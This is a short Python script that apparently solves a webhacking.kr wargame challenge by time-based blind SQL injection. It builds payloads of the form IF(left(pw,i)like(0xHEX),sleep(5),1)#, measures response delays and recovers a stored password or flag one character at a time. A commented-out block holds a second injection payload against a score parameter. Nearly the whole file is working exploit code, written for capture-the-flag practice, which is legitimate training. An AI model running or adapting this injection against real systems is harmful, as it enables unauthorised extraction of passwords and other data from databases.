import requests
import string
import time

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)


URL = "https://webhacking.kr/challenge/web-34/?msg=dcab&se="
SESSION_ID = "1123"
cookies = {'PHPSESSID':SESSION_ID}
params ={'msg':'dcba'}
headers = {
    "Cache-Control": "no-cache",
    "Pragma": "no-cache"
}

password = "FLAG{y2u.be/kmpgjr0el64"
i = len(password)+1
while True:    
    for c in string.printable:
        hex = string_to_hex((password+c).replace("_", r"\_").replace('.',r'\.').replace('%',r'\%'))
        payload = f"IF(left(pw,{i})like(0x{hex}),sleep(5),1)#"
        # print(f"{c}: {payload}")
        print(c)
        before = time.time()
        response = requests.get(URL+payload, cookies=cookies, headers=headers)
        # print(response.text)
        after = time.time()
        
        # print(f"Time: {after - before} seconds")
        if after - before > 5:
            i += 1
            password += c
            print(password)
            break
    

# ?score=770%20or%20left(id,4)like(0x61646D69)#6E)"
# url_res = "https://webhacking.kr/challenge/web-31/rank.php"
# params = {'score':'1'}
# response = requests.get(url_res, params=params, cookies=cookies)
# print(response.text)
